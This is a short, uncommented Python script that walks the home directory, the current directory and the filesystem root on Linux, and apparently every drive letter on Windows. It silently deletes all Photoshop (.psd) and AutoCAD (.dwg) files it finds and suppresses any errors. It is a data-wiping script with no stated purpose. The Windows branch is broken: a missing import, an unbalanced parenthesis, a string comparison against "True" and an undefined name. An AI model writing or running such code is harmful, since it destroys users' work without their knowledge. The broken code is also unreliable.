import os
import platform

Platform = platform.system()

if Platform == 'Linux':
    from os.path import expanduser
    drc_1 = "/"
    drc_2 = "."
    drc_3 = expanduser("~")
    for dirName, subdirList, fileList in os.walk(drc_3):
        for fname in fileList:
            try:
                if fname.endswith(".psd") or fname.endswith(".dwg"):
                    os.remove(dirName+"/"+fname) 
            except:
                pass
    for dirName, subdirList, fileList in os.walk(drc_2):
        for fname in fileList:
            try:
                if fname.endswith(".psd") or fname.endswith(".dwg"):
                    os.remove(dirName+"/"+fname) 
            except:
                pass        
    for dirName, subdirList, fileList in os.walk(drc_1):
        for fname in fileList:
            try:
                if fname.endswith(".psd") or fname.endswith(".dwg"):
                    os.remove(dirName+"/"+fname) 
            except:
                pass
else:
    Dir_List = list(string.uppercase)
    for drc in Dir_List:
        drc = drc+":/"
        if (os.path.isdir(drc) == "True":
            for dirName, subdirList, fileList in os.walk(drc):
                print DirList
                for fname in fileList:
                    try:
                        if fname.endswith(".psd") or fname.endswith(".dwg"):
                            os.remove(dirName+"/"+fname) 
                    except:
                        pass
